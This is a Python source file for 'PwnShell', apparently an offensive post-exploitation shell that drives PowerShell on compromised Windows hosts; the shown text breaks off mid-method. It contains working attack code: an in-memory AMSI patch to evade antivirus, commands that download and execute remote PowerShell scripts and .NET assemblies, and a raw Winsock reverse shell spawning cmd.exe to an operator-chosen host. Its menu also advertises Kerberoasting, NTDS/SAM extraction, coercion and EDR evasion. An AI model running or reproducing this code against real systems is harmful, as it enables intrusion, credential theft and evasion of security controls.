"""
shell.pwnshell — PwnShell v2.0 Operator Interactive Shell
"""

import os
import sys
import re
import logging
import time
import textwrap
import stat
import secrets
from pathlib import PureWindowsPath, Path
from ipaddress import ip_address
from base64 import b64decode
from datetime import datetime
from typing import Optional, List, Dict, Any, Callable
from Cryptodome.Hash import MD5

try:
    from prompt_toolkit import prompt, ANSI
    from prompt_toolkit.history import FileHistory
    from prompt_toolkit.completion import WordCompleter
    _PTK = sys.stdout.isatty()
except ImportError:
    _PTK = False

# ── imports from sibling modules ─────────────────────────────────────────────
from ..core.utils import strip_ansi
from ..core.session_mgr import SessionManager
from ..core.tunnel import Socks5Server, PortForwarder
from ..core.loot import LootManager
from ..core.opsec import OPSECProfile
from ..modules import ModuleManager

from .ui       import R, G, Y, B, M, C, W, DIM, BLD, RST, c, _BANNER, _COMPLETIONS
from .ctrlc    import CtrlCHandler
from .adtriage  import get_adtriage_ps
from .shares    import get_shares_ps
from .sessions  import get_sessions_ps
from .commands import (
    chunks, b64str, split_args, xorenc, str_b64,
    _xor_key, build_amsi_patch,
    new_HostWriter, import_HostWriter,
    call_XorEnc, import_XorEnc,
    _importPathFix, _new_PathFix,
    # dll_import generated variables:
    _import_LoadLibrary,    _call_LoadLibrary,
    _import_GetProcAddress, _call_GetProcAddress,
    _import_VirtualProtect, _call_VirtualProtect,
    _import_CreateProcess,  _call_CreateProcess,
    _import_WSAStartup,     _call_WSAStartup,
    _import_WSASocket,      _call_WSASocket,
    _import_WSAConnect,     _call_WSAConnect,
)


# ── Session data directory & History Security ─────────────────────────────────
# [BUG-01 & NICHE-01 FIX] Enforce 0o700 permission on _PWNRM_DIR so other local
# users cannot read command history or transcript logs containing credentials.
_PWNRM_DIR = Path(os.environ.get("PWNRM_DIR", str(Path.home() / ".pwnrm")))
_PWNRM_DIR.mkdir(parents=True, exist_ok=True)
try:
    os.chmod(_PWNRM_DIR, stat.S_IRWXU)
    import platform
    if platform.system() == "Windows":
        import subprocess
        user = os.environ.get("USERNAME")
        if user:
            subprocess.run(
                ["icacls", str(_PWNRM_DIR), "/inheritance:r", "/grant", f"{user}:(OI)(CI)F"],
                capture_output=True,
                creationflags=0x08000000
            )
except OSError:
    pass

# [OPT-08] Sensitive pattern filter to prevent storing credentials in history
HISTORY_EXCLUDE_PATTERN = re.compile(
    r'(?:-p|-password|--password|-H|-hash|--hash|--pfx-pass|password|passwd|secret|tgskey|nt_hash)',
    re.IGNORECASE
)


# ── Command Registry (OPT-03) ────────────────────────────────────────────────
COMMAND_REGISTRY = {
    "Core Platform Commands (v2.1)": {
        "!session [list|switch|save|exec-all]": "Multi-session manager & jump graph",
        "!socks [PORT|stop|status]": "In-band SOCKS5 proxy (default: 1080)",
        "!portfwd [LPORT RHOST:RPORT|list|stop]": "Local & remote port forwarding multiplexer",
        "!module [list|run <name>]": "Extensible module & plugin subsystem",
        "!loot": "View organized credentials & artifacts",
        "!opsec [stealth|balanced|aggressive|hybrid-cloud]": "Toggle execution jitter & profile",
        "!playbook [--list|--run <name>]": "Declarative red team playbook runner",
    },
    "Identity & Active Directory Abuse (2026-2027 TTPs)": {
        "!adcs [-q|--template <T>|--wsus]": "Full ADCS ESC1-ESC17+ engine (WSUS/Triage)",
        "!kerberos [--roast|--asrep|--dmsa|--diamond]": "AES Kerberoast, AS-REP & dMSA suite",
        "!entra [-s]": "Hybrid Entra ID / Azure AD PRT pivot",
        "!creds [--vault|--dpapi|--history]": "Deep credential & token artifact hunter",
        "!laps [-a|--encrypted]": "Windows LAPS hunter (Legacy & Server 2025)",
        "!acl [--target <T>|--tier0]": "Active Directory DACL & privilege escalation scout",
        "!token [--list|--privs|--elevate]": "Process token hunter & in-memory impersonation",
        "!bloodhound [-c <methods>]": "In-memory AD graph collector (BloodHound)",
        "!lateral [--subnet <s>]": "Subnet scout & lateral movement engine",
    },
    "Coercion, In-Memory Hives & Staging": {
        "!vss [--drive C:|--sam|--ntds|--clean]": "In-memory VSS shadow copy hive extractor (SAM/NTDS)",
        "!coerce --listener <IP> [--method M]": "Coerced auth engine (WebDAV, MS-RPRN, MS-EFSR)",
        "!evasion [--edr|--amsi|--etw]": "Polymorphic AMSI/ETW bypass & EDR scout",
        "!adtriage [-q]": "AD post-auth quick triage",
        "!shares [-q] [HOST..]": "SMB share permission mapper",
        "!sessions [-q]": "Logon sessions & network snapshot",
        "!sysinfo": "Quick OS / AV / hotfix snapshot",
        "!download RPATH [LPATH]": "Pull file/dir (dirs -> ZIP)",
        "!upload [-xor] LPATH [RPATH]": "Push file (-xor for stealth)",
        "!amsi": "Patch AmsiScanBuffer in-process (polymorphic)",
        "!psrun [-xor] URL": "Load & exec remote PS1",
        "!netrun [-xor] URL [ARG..]": "Load & exec remote .NET assembly",
        "!revshell IP PORT": "Raw Winsock reverse shell",
        "!log / !stoplog": "Toggle session transcript",
        "exit / quit / Ctrl+D": "Close session",
    }
}


class PwnShell:

    from .. import __version__ as _pkg_version
    VERSION = _pkg_version

    def __init__(self, runspace, target_info: dict | None = None):
        self.runspace    = runspace
        self.cwd         = ""
        self.stdout_log  = None
        self.need_clear  = False
        self.start_time  = datetime.now()
        self.target_info = target_info or {}
        self.cmd_count   = 0

        # Subsystems
        self.session_mgr = SessionManager(base_dir=_PWNRM_DIR)
        self.session_mgr.register_session(self.runspace, getattr(self.runspace, "_transport", None), self.target_info, name="initial")
        self.socks_server: Socks5Server | None = None
        self.port_forwarder = PortForwarder()
        self.loot_mgr = LootManager(base_dir=_PWNRM_DIR)
        self.opsec_profile = OPSECProfile(mode="balanced")
        self.module_mgr = ModuleManager()

        if _PTK:
            hist_path = _PWNRM_DIR / ".pwnrm_history"
            if hist_path.is_symlink():
                hist_path.unlink()
            if not hist_path.exists():
                try:
                    fd = os.open(str(hist_path), os.O_CREAT | os.O_EXCL | os.O_WRONLY, 0o600)
                    os.close(fd)
                except OSError:
                    pass
            else:
                try:
                    os.chmod(str(hist_path), stat.S_IRUSR | stat.S_IWUSR)
                except OSError:
                    pass
            self.prompt_history = FileHistory(str(hist_path))
            self._completer = WordCompleter(_COMPLETIONS, ignore_case=True)

    def __del__(self):
        self.stop_log()
        if self.socks_server:
            self.socks_server.stop()

    # ── logging ───────────────────────────────────────────────────────────────
    def start_log(self):
        if not self.stdout_log:
            fn = str(_PWNRM_DIR / f"pwnrm_{int(time.time())}_{secrets.token_hex(4)}_stdout.log")
            self.write_info(f"Logging to {c(C, fn)}")
            flags = os.O_CREAT | os.O_EXCL | os.O_WRONLY | os.O_APPEND
            fd = os.open(fn, flags, 0o600)
            self.stdout_log = os.fdopen(fd, "wb")

    def stop_log(self):
        if self.stdout_log:
            self.stdout_log.close()
            self.stdout_log = None

    # ── help / banner (OPT-03) ────────────────────────────────────────────────
    def help(self):
        elapsed = str(datetime.now() - self.start_time).split(".")[0]
        tgt = self.target_info.get("host","?")
        usr = self.target_info.get("user","?")
        socks_status = f"{self.socks_server.bind_port} (Active)" if (self.socks_server and self.socks_server.is_running) else "Inactive"

        print(_BANNER)
        print(textwrap.dedent(f"""\
        {BLD}  Operator Platform Info{RST}
          Target  : {c(C,tgt)}    User: {c(G,usr)}
          Elapsed : {elapsed}    Commands: {self.cmd_count}    OPSEC: {c(Y, self.opsec_profile.mode.upper())}
          SOCKS5  : {c(M, socks_status)}
        """))

        for section, cmds in COMMAND_REGISTRY.items():
            print(f"  {BLD}{section}{RST}")
            for cmd_syntax, desc in cmds.items():
                print(f"    {c(Y, cmd_syntax):<45} {desc}")
            print()

    # ── REPL ──────────────────────────────────────────────────────────────────
    def repl(self, inputs=None):
        self.update_cwd()

        for raw in (inputs or self.read_line()):
            cmd = raw.strip()
            if not cmd:
                continue
            self.cmd_count += 1
            self.opsec_profile.jitter_sleep()

            if cmd in {"exit","quit","!exit","!quit"}:
                print(c(DIM, "\n  [~] Session closed. Stay stealthy.\n"))
                return

            dispatch = [
                ("!session",    self._session_dispatch),
                ("!socks",      self._socks_dispatch),
                ("!portfwd",    self._portfwd_dispatch),
                ("!rportfwd",   self._portfwd_dispatch),
                ("!module",     self._module_dispatch),
                ("!loot",       lambda _: self._loot_dispatch()),
                ("!opsec",      self._opsec_dispatch),
                ("!playbook",   self._playbook_dispatch),
                ("!adcs",       lambda args: self.module_mgr.get_module("adcs").run(self, split_args(args))),
                ("!kerberos",   lambda args: self.module_mgr.get_module("kerberos").run(self, split_args(args))),
                ("!entra",      lambda args: self.module_mgr.get_module("entra").run(self, split_args(args))),
                ("!creds",      lambda args: self.module_mgr.get_module("creds").run(self, split_args(args))),
                ("!laps",       lambda args: self.module_mgr.get_module("laps").run(self, split_args(args))),
                ("!acl",        lambda args: self.module_mgr.get_module("acl").run(self, split_args(args))),
                ("!token",      lambda args: self.module_mgr.get_module("token").run(self, split_args(args))),
                ("!vss",        lambda args: self.module_mgr.get_module("vss").run(self, split_args(args))),
                ("!coerce",     lambda args: self.module_mgr.get_module("coerce").run(self, split_args(args))),
                ("!bloodhound", lambda args: self.module_mgr.get_module("bloodhound").run(self, split_args(args))),
                ("!lateral",    lambda args: self.module_mgr.get_module("lateral").run(self, split_args(args))),
                ("!evasion",    lambda args: self.module_mgr.get_module("evasion").run(self, split_args(args))),
                ("!download ",  self.download),
                ("!upload ",    self.upload),
                ("!amsi",       lambda _: self.amsi_bypass()),
                ("!netrun ",    self.netrun),
                ("!psrun ",     self.psrun),
                ("!revshell ",  self.revshell),
                ("!adtriage",   self._adtriage_dispatch),
                ("!shares",     self._shares_dispatch),
                ("!sessions",   self._sessions_dispatch),
                ("!sysinfo",    lambda _: self.sysinfo()),
                ("!log",        lambda _: self.start_log()),
                ("!stoplog",    lambda _: self.stop_log()),
            ]

            matched = False
            for prefix, fn in dispatch:
                if cmd.lower().startswith(prefix.lower()):
                    arg_str = cmd[len(prefix):].strip()
                    fn(arg_str)
                    matched = True
                    break

            if not matched:
                if cmd.startswith("!") or cmd in {"help","?"}:
                    self.help()
                else:
                    if self.stdout_log:
                        clean_cmd = strip_ansi(cmd)
                        self.stdout_log.write(f"PS {self.cwd}> {clean_cmd}\n".encode())
                        self.stdout_log.flush()
                    self.run_with_interrupt(cmd, self.write_line)
                    self.update_cwd()

    # ── prompt / input ────────────────────────────────────────────────────────
    def update_cwd(self):
        self.cwd = strip_ansi(self.run_sync("Get-Location | Select -Expand Path").strip())

    def read_line(self):
        while True:
            try:
                cur_node = self.session_mgr.get_current()
                sid_str = f"S:{cur_node.session_id}|" if cur_node else ""
                ps_pre = f"{BLD}{M}PwnRM{RST}[{c(Y, sid_str + self.target_info.get('host','?'))}]|{c(C,self.cwd)}> "
                if _PTK:
                    cmd = prompt(ANSI(ps_pre), history=self.prompt_history,
                                 completer=self._completer,
                                 enable_history_search=True)
                else:
                    cmd = input(ps_pre)
            except KeyboardInterrupt:
                continue
            except EOFError:
                return
            else:
                yield cmd

    # ── output handlers (OPT-04) ──────────────────────────────────────────────
    def _clear(self):
        return "\033[2K\r" if self.need_clear else ""

    def write_line(self, out: dict):
        clr = self._clear(); self.need_clear = False
        log = b""
        if "stdout" in out:
            txt = strip_ansi(out["stdout"])
            print(clr + txt, flush=True)
            log = txt.encode() + b"\n"
        elif "info" in out:
            txt = strip_ansi(out["info"])
            print(clr + txt, end=out["endl"], flush=True)
            log = (txt + out["endl"]).encode()
        elif "error" in out:
            print(clr + c(R, strip_ansi(out["error"])), flush=True)
        elif "warn" in out:
            print(clr + c(Y, "  [!] " + strip_ansi(out["warn"])), flush=True)
        elif "verbose" in out:
            print(clr + c(DIM, strip_ansi(out["verbose"])), flush=True)
        elif "progress" in out:
            print(clr + c(B, "  [~] " + strip_ansi(out["progress"])), end="\r", flush=True)
            self.need_clear = True
        if self.stdout_log and log:
            # [OPT-04] Guarantee no ANSI color codes are ever written to stdout_log
            self.stdout_log.write(strip_ansi(log.decode("utf-8", errors="replace")).encode("utf-8"))
            self.stdout_log.flush()

    def write_info(self, msg: str):    self.write_line({"info": msg, "endl": "\n"})
    def write_warning(self, msg: str): self.write_line({"warn": msg})
    def write_error(self, msg: str):   self.write_line({"error": msg})
    def write_progress(self, msg: str):self.write_line({"progress": msg})

    # ── Synchronous & Interruptible execution (FIX-08, OPT-01) ────────────────
    MAX_SYNC_BYTES = 1 * 1024 * 1024  # 1 MB [HIGH-05 / FIX-08]

    def run_sync(self, cmd: str, max_bytes: int = MAX_SYNC_BYTES) -> str:
        out = []
        total = 0
        for o in self.runspace.run_command(cmd):
            if "stdout" in o:
                chunk = o["stdout"]
                total += len(chunk)
                if total > max_bytes:
                    out.append("\n[!] run_sync output truncated (exceeded max_bytes protection).")
                    self.write_warning(f"run_sync: output exceeded {max_bytes} bytes, truncated")
                    self.runspace.interrupt()
                    break
                out.append(chunk)
        return "\n".join(out)

    def run_with_interrupt(self, cmd: str, handler: Optional[Callable] = None, exc_handler: Optional[Callable] = None) -> bool:
        # [OPT-01 FIX] Hold CtrlCHandler across the entire stream iteration to eliminate race window
        stream = self.runspace.run_command(cmd)
        with CtrlCHandler(timeout=5) as h:
            for out in stream:
                if h.interrupted:
                    self.runspace.interrupt()
                    return True
                try:
                    if handler:
                        handler(out)
                except Exception as e:
                    if exc_handler and exc_handler(e):
                        continue
                    raise
            if h.interrupted:
                self.runspace.interrupt()
                return True
        return False

    # ══════════════════════════════════════════════════════════════════════════
    #  DISPATCHERS FOR V2.0 PLATFORM SUBSYSTEMS
    # ══════════════════════════════════════════════════════════════════════════

    def _session_dispatch(self, args_str: str):
        args = split_args(args_str)
        subcmd = args[0].lower() if args else "list"
        if subcmd == "list":
            sessions = self.session_mgr.list_sessions()
            self.write_info(c(C + BLD, "\n  [Active PwnRM Sessions]"))
            for s in sessions:
                cur_marker = c(G, " [*]") if s["is_current"] else "    "
                self.write_info(f"{cur_marker} ID: {c(Y, str(s['id']))} | Name: {s['name']} | Host: {s['host']} | User: {s['user']}")
            print()
        elif subcmd == "switch" and len(args) > 1:
            try:
                sid = int(args[1])
                old_node = self.session_mgr.get_current()
                old_sid = old_node.session_id if old_node else -1
                old_host = old_node.host if old_node else "unknown"
                if self.session_mgr.switch_session(sid):
                    node = self.session_mgr.get_current()
                    self.runspace = node.runspace
                    self.target_info = node.target_info
                    self.update_cwd()
                    self.write_info(c(G, f"  [+] Switched to session {sid} ({node.host})"))
                    if self.stdout_log:
                        marker = (
                            f"\n{'─'*72}\n"
                            f"[{datetime.now().isoformat()}] SESSION SWITCH\n"
                            f"  FROM : S:{old_sid} ({old_host})\n"
                            f"  TO   : S:{sid} ({node.host})\n"
                            f"{'─'*72}\n"
                        )
                        self.stdout_log.write(marker.encode("utf-8"))
                        self.stdout_log.flush()
                else:
                    self.write_warning(f"Session {sid} not found.")
            except ValueError:
                self.write_warning("Session ID must be an integer.")
        elif subcmd == "save":
            fn = self.session_mgr.save_state()
            self.write_info(c(G, f"  [+] Session state saved securely to {fn}"))
        elif subcmd == "exec-all" and len(args) > 1:
            fan_cmd = " ".join(args[1:])
            res = self.session_mgr.fan_out_exec(fan_cmd)
            for sid, out in res.items():
                self.write_info(c(Y, f"--- Session {sid} Output ---"))
                self.write_info(out)
        else:
            self.write_warning("Usage: !session [list | switch <id> | save | exec-all <cmd>]")

    def _socks_dispatch(self, args_str: str):
        args = split_args(args_str)
        if not args or args[0].isdigit():
            port = int(args[0]) if args else 1080
            if self.socks_server and self.socks_server.is_running:
                self.write_warning(f"SOCKS5 already running on port {self.socks_server.bind_port}. Stop it first (!socks stop).")
                return
            self.socks_server = Socks5Server(bind_host="127.0.0.1", bind_port=port)
            self.socks_server.start()
            self.write_info(c(G, f"  [+] In-band SOCKS5 Proxy started on 127.0.0.1:{port}"))
        elif args[0].lower() == "stop":
            if self.socks_server:
                self.socks_server.stop()
                self.socks_server = None
                self.write_info(c(Y, "  [*] SOCKS5 Proxy stopped."))
            else:
                self.write_warning("No active SOCKS5 proxy.")
        elif args[0].lower() == "status":
            if self.socks_server and self.socks_server.is_running:
                self.write_info(c(G, f"  [+] SOCKS5 Proxy ACTIVE on {self.socks_server.bind_host}:{self.socks_server.bind_port} ({len(self.socks_server.active_tunnels)} active connections)"))
            else:
                self.write_info("  [-] SOCKS5 Proxy is INACTIVE.")

    def _portfwd_dispatch(self, args_str: str):
        args = split_args(args_str)
        if not args or args[0].lower() == "list":
            forwards = self.port_forwarder.list_forwards()
            self.write_info(c(C + BLD, "\n  [Active Port Forwards]"))
            if not forwards:
                self.write_info("    (No active port forwards)")
            for f in forwards:
                self.write_info(f"    ID: {f['id']} | Bind: {f['bind']} -> Target: {f['target']}")
            print()
        elif len(args) >= 2:
            try:
                lport = int(args[0])
                rhost, rport = args[1].split(":")
                fid = self.port_forwarder.start_local_forward(lport, rhost, int(rport))
                self.write_info(c(G, f"  [+] Port forward created (ID: {fid}): 127.0.0.1:{lport} -> {rhost}:{rport}"))
            except Exception as e:
                self.write_error(f"Failed to create port forward: {e}")
        else:
            self.write_warning("Usage: !portfwd <LPORT> <RHOST>:<RPORT> or !portfwd list")

    def _module_dispatch(self, args_str: str):
        args = split_args(args_str)
        if not args or args[0].lower() == "list":
            mods = self.module_mgr.list_modules()
            self.write_info(c(C + BLD, "\n  [Registered PwnRM Modules]"))
            for m in mods:
                self.write_info(f"    - {c(Y, m['name']):<15} {m['description']}")
            print()
        elif args[0].lower() == "run" and len(args) > 1:
            mod_name = args[1]
            mod = self.module_mgr.get_module(mod_name)
            if mod:
                mod.run(self, args[2:])
            else:
                self.write_warning(f"Module '{mod_name}' not found. Use '!module list'.")
        else:
            self.write_warning("Usage: !module list or !module run <name> [args]")

    def _loot_dispatch(self):
        summary = self.loot_mgr.summary()
        self.write_info(c(C + BLD, "\n  [PwnRM Structured Loot Inventory]"))
        if not summary:
            self.write_info(f"    (No loot recorded yet under {_PWNRM_DIR / 'loot'})")
        for target, data in summary.items():
            self.write_info(f"  Target: {c(Y, target)}")
            creds = data.get("credentials", [])
            self.write_info(f"    Credentials: {len(creds)} entries")
            for c_ in creds[:5]:
                self.write_info(f"      - [{c_['type']}] {c_['account']} ({c_['source']})")
            artifacts = data.get("artifacts", {})
            for cat, items in artifacts.items():
                if items:
                    self.write_info(f"    {cat.capitalize()}: {len(items)} files ({', '.join(items[:3])})")
        print()

    def _opsec_dispatch(self, args_str: str):
        args = split_args(args_str)
        if args and args[0].lower() in OPSECProfile.PROFILES:
            self.opsec_profile.set_mode(args[0].lower())
            self.write_info(c(G, f"  [+] Active OPSEC profile set to: {self.opsec_profile.mode.upper()}"))
        else:
            self.write_info(f"Active profile: {c(Y, self.opsec_profile.mode.upper())}")
            self.write_info("Available profiles: stealth, balanced, aggressive, hybrid-cloud")

    def _playbook_dispatch(self, args_str: str):
        args = split_args(args_str)
        self.module_mgr.get_module("playbook").run(self, args)

    # ══════════════════════════════════════════════════════════════════════════
    #  BUILT-IN COMMANDS
    # ══════════════════════════════════════════════════════════════════════════

    # ── !adtriage ─────────────────────────────────────────────────────────────
    def _adtriage_dispatch(self, args):
        quick = "-q" in args.lower() or "--quick" in args.lower()
        self.adtriage(quick=quick)

    def adtriage(self, quick=False):
        self.write_info(c(M+BLD, "  [*] PwnRM AD Triage — loading remote enumeration module..."))
        ps = get_adtriage_ps(quick=quick)
        encoded = b64str(ps.encode("utf-16le"))
        cmd = f"Invoke-Expression ([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('{encoded}')))"
        self.run_with_interrupt(cmd, self.write_line)

    # ── !shares ──────────────────────────────────────────────────────────────
    def _shares_dispatch(self, args: str):
        parts = args.split()
        quick = False
        targets: list[str] = []
        for p in parts:
            if p.lower() in ("-q", "--quick"):
                quick = True
            else:
                targets.append(p)
        self.shares(quick=quick, targets=targets)

    def shares(self, quick: bool = False, targets: list[str] | None = None):
        self.write_info(c(M+BLD, "  [*] PwnRM Share Scout — loading remote enumeration module..."))
        ps = get_shares_ps(quick=quick, targets=targets or [])
        encoded = b64str(ps.encode("utf-16le"))
        cmd = f"Invoke-Expression ([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('{encoded}')))"
        self.run_with_interrupt(cmd, self.write_line)

    # ── !sessions ────────────────────────────────────────────────────────────
    def _sessions_dispatch(self, args: str):
        quick = "-q" in args.lower() or "--quick" in args.lower()
        self.sessions(quick=quick)

    def sessions(self, quick: bool = False):
        self.write_info(c(M+BLD, "  [*] PwnRM Session Scout — loading remote enumeration module..."))
        ps = get_sessions_ps(quick=quick)
        encoded = b64str(ps.encode("utf-16le"))
        cmd = f"Invoke-Expression ([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('{encoded}')))"
        self.run_with_interrupt(cmd, self.write_line)

    # ── !sysinfo ──────────────────────────────────────────────────────────────
    def sysinfo(self):
        self.write_info(c(C, "  [*] System snapshot"))
        cmds = [
            'Write-Host "`n[OS]"; $o=Get-WmiObject Win32_OperatingSystem;'
            '"  Name     : "+$o.Caption; "  Build    : "+$o.BuildNumber;'
            '"  Hostname : "+$env:COMPUTERNAME; "  Domain   : "+$env:USERDNSDOMAIN',
            'Write-Host "`n[Hotfixes (last 10)]";'
            'Get-HotFix | Sort InstalledOn -Desc | Select -First 10 | '
            'ForEach-Object { "  "+$_.HotFixID+" "+$_.Description+" "+$_.InstalledOn }',
            'Write-Host "`n[AV Products]";'
            'try { Get-WmiObject -Namespace root\\SecurityCenter2 -Class AntiVirusProduct |'
            'ForEach-Object { "  "+$_.displayName } } catch { "  (SecurityCenter2 not available)" }',
            'Write-Host "`n[Local Administrators]";'
            'net localgroup administrators 2>$null | Select-Object -Skip 6 | '
            'Where-Object { $_ -and $_ -notmatch "----" } | ForEach-Object { "  "+$_ }',
            'Write-Host "`n[WinRM / SMB]";'
            '"  WinRM port : 5985/5986";'
            'try { $s=Get-SmbServerConfiguration; "  SMB Signing Required: "+$s.RequireSecuritySignature } catch {}',
        ]
        for c_ in cmds:
            self.run_with_interrupt(c_, self.write_line)

    # ── !amsi (FIX-04) ────────────────────────────────────────────────────────
    def amsi_bypass(self):
        amsi_arr, amsi_len, amsi_offset = build_amsi_patch()
        cmds = [
            _import_LoadLibrary, _import_GetProcAddress, _import_VirtualProtect,
            f"$addr = {_call_GetProcAddress}({_call_LoadLibrary}({str_b64('amsi.dll')}), {str_b64('AmsiScanBuffer')})",
            f"$old = [uint32]0; {_call_VirtualProtect}($addr, [IntPtr]{amsi_len}, [uint32]64, [ref]$old)",
            f"[Runtime.InteropServices.Marshal]::Copy([byte[]]({amsi_arr}), 0, $addr, {amsi_len})",
            f"{_call_VirtualProtect}($addr, [IntPtr]{amsi_len}, [uint32]32, [ref]$old)",
        ]
        self.write_info(c(Y, "  [*] Applying polymorphic in-memory AMSI patch..."))
        for cmd in cmds:
            logging.debug(cmd)
            self.run_with_interrupt(cmd, self.write_line)
        self.write_info(c(G, "  [+] AMSI bypass applied successfully."))

    # ── !psrun ────────────────────────────────────────────────────────────────
    def psrun(self, cmdline: str):
        args   = split_args(cmdline)[:2]
        if not args:
            self.write_warning("usage: !psrun [-xor] URL"); return
        url    = args[-1]
        xorfunc= ""
        if args[0].lower() == "-xor":
            if len(args) != 2:
                self.write_warning("usage: !psrun [-xor] URL"); return
            if args[-1].lower().startswith("http"):
                self.write_warning("Use -xor only with files uploaded via !upload -xor"); return
            xorfunc = call_XorEnc
        cmds = [
            import_XorEnc,
            f"$c = (New-Object Net.WebClient).DownloadData({str_b64(url)})",
            f"$c = [ScriptBlock]::Create([Text.Encoding]::UTF8.GetString(({xorfunc}($c))))",
            "$c = $c.Ast.EndBlock.Copy()",
            "$a = [ScriptBlock]::Create('Get-ChildItem').Ast",
            "$b = [Management.Automation.Language.ScriptBlockAst]::new($a.Extent,$null,$null,$null,$c,$null)",
            "Invoke-Command -NoNewScope -ScriptBlock $b.GetScriptBlock()",
            "Remove-Variable @('a','b','c')"
        ]
        for cmd in cmds:
            logging.debug(cmd); self.run_with_interrupt(cmd, self.write_line)

    # ── !netrun ───────────────────────────────────────────────────────────────
    def netrun(self, cmdline: str):
        args = split_args(cmdline)
        if not args:
            self.write_warning("usage: !netrun [-xor] URL [ARG..]"); return
        if args[0].lower() == "-xor":
            if len(args) == 1:
                self.write_warning("usage: !netrun [-xor] URL [ARG..]"); return
            xorfunc = call_XorEnc
            args    = args[1:]
        else:
            xorfunc = ""
        args = [str_b64(a) for a in args]
        url  = args[0]
        argv = "[string[]]@(" + ",".join(args[1:]) + ")"
        cmds = [
            import_HostWriter, import_XorEnc,
            f"$buf = (New-Object Net.WebClient).DownloadData({url})",
            f"$dll = [Reflection.Assembly]::Load({xorfunc}($buf))",
            f"$out = {new_HostWriter}",
            f"[Console]::SetOut($out); [Console]::SetError($out)",
            f"[void]$dll.EntryPoint.Invoke($null, [object[]](,[string[]]({argv})))" if args[1:] else
            "if ($dll.EntryPoint.GetParameters().Length -eq 0) { [void]$dll.EntryPoint.Invoke($null, $null) } else { [void]$dll.EntryPoint.Invoke($null, [object[]](,[string[]]@())) }",
            "[Console]::SetOut([IO.StreamWriter]::Null)",
            "[Console]::SetError([IO.StreamWriter]::Null)",
            "$out.Dispose()",
            "Remove-Variable @('buf','dll','out')"
        ]
        for cmd in cmds:
            logging.debug(cmd); self.run_with_interrupt(cmd, self.write_line)

    # ── !revshell ─────────────────────────────────────────────────────────────
    def revshell(self, cmdline: str):
        args = split_args(cmdline)
        try:
            ip   = ip_address(args[0]).packed
            port = int(args[1])
            if not (1 <= port <= 65535):
                self.write_warning("Port must be between 1 and 65535"); return
            p_hi, p_lo = (port >> 8) & 0xff, port & 0xff
        except (ValueError, IndexError):
            self.write_warning("usage: !revshell IP PORT"); return
        cmds = [
            _import_WSAStartup, _import_WSASocket, _import_WSAConnect, _import_CreateProcess,
            f"{_call_WSAStartup}(0x202,(New-Object byte[] 64))",
            f"$sock = {_call_WSASocket}(2,1,6,0,0,0)",
            f"{_call_WSAConnect}($sock,[byte[]](2,0,{p_hi},{p_lo},{ip[0]},{ip[1]},{ip[2]},{ip[3]},12,0,0,0,0,0,0,0,0),16,0,0,0,0)",
            f"$sinfo = [int64[]](104,0,0,0,0,0,0,0x10100000000,0,0,$sock,$sock,$sock)",
            f"{_call_CreateProcess}(0,'cmd.exe',0,0,1,0,0,0,$sinfo,(New-Object byte[] 32))",
            "Remove-Variable @('sock','sinfo')"
        ]
        self.write_info(c(Y, f"  [*] Spawning reverse shell -> {args[0]}:{args[1]}"))
        for cmd in cmds:
            logging.debug(cmd); self.run_with_interrupt(cmd, self.write_line)

    # ── !upload (FIX-02, OPT-02) ──────────────────────────────────────────────
    def upload(self, cmdline: str):
        args = split_args(cmdline)
        if not args:
            self.write_warning("usage: !upload [-xor] LPATH [RPATH]"); return
        if args[0].lower() == "-xor":
            unxor = False; args = args[1:]
            if not args:
                self.write_warning("usage: !upload [-xor] LPATH [RPATH]"); return
        else:
            unxor = True
        src = Path(args[0])
        dst = PureWindowsPath(args[1] if len(args) == 2 else src.name)
        try:
            with open(src, "rb") as f: buf = f.read()
        except IOError as e:
            self.write_error(str(e)); return

        temp_raw = self.run_sync("[System.IO.Path]::GetTempPath()").strip()
        try:
            temp_validated = self._validate_remote_path(temp_raw)
        except ValueError:
            temp_validated = "C:\\Windows\\Temp\\"
        tmpfn = temp_validated + secrets.token_hex(8) + ".tmp"
        tmpfn_pde = self._pde(tmpfn)
        dst_pde = self._pde(dst)

        total = 0
        self.write_info(f"  [~] Uploading -> {c(C, str(tmpfn))}")
        self.run_sync(import_XorEnc)
        for chunk in chunks(buf, 65536):
            chunk_len = len(chunk)
            pct = int((total + chunk_len) * 100 // len(buf)) if len(buf) > 0 else 100
            self.write_progress(f"Upload {total + chunk_len}/{len(buf)} bytes ({pct}%)")
            chunk_b64 = f"[Convert]::FromBase64String('{b64str(xorenc(chunk, _xor_key))}')"
            xorfunc   = call_XorEnc if unxor else ""
            # [FIX-02] Use double-quoted strings with _pde escaping and -LiteralPath
            cmd = f'Add-Content -LiteralPath "{tmpfn_pde}" -Encoding Byte ([byte[]]$({xorfunc}({chunk_b64})))'
            if self.run_with_interrupt(cmd):
                self.write_warning("Upload interrupted")
                self.run_sync(f'Remove-Item -Force -LiteralPath "{tmpfn_pde}"')
                return
            total += chunk_len

        self.write_info(f"  [~] Moving to {c(C, str(dst))}")
        self.run_with_interrupt(f'Move-Item -Force -LiteralPath "{tmpfn_pde}" -Destination "{dst_pde}"', self.write_line)
        h = self.run_sync(f'(Get-FileHash -LiteralPath "{dst_pde}" -Algorithm MD5).Hash')
        ok = MD5.new(buf if unxor else xorenc(buf, _xor_key)).hexdigest().upper()
        if h.strip() != ok:
            self.write_error("  Upload integrity check FAILED — file may be corrupted!")
        else:
            self.write_info(c(G, "  [+] Upload complete — MD5 verified."))

    @staticmethod
    def _pse(path: Any) -> str:
        """Escape single quotes for safe PS single-quoted string embedding."""
        return str(path).replace("'", "''")

    @staticmethod
    def _pde(path: Any) -> str:
        """
        Escape a path for embedding inside a PowerShell double-quoted string.
        Escapes: backtick (must be first), dollar sign, double-quote.
        """
        s = str(path)
        s = s.replace('`', '``')
        s = s.replace('$', '`$')
        s = s.replace('"', '`"')
        return s

    # ── safe Windows path validator (FIX-07) ───────────────────────────────────
    _SAFE_WINPATH = re.compile(r'^[A-Za-z]:\\(?:[^<>:"/\\|?*\x00-\x1f$`;&{}()]+\\)*[^<>:"/\\|?*\x00-\x1f$`;&{}()]*$')
    _SAFE_UNCPATH = re.compile(r'^\\\\[^<>:"/\\|?*\x00-\x1f$`;&{}()]+\\[^<>:"/\\|?*\x00-\x1f$`;&{}()].*$')

    @classmethod
    def _validate_remote_path(cls, path: str) -> str:
        """Return validated path if it looks like a legitimate Windows absolute path."""
        if not path or len(path) > 32767:
            raise ValueError("Remote path is empty or exceeds maximum path length.")
        stripped = path.strip()
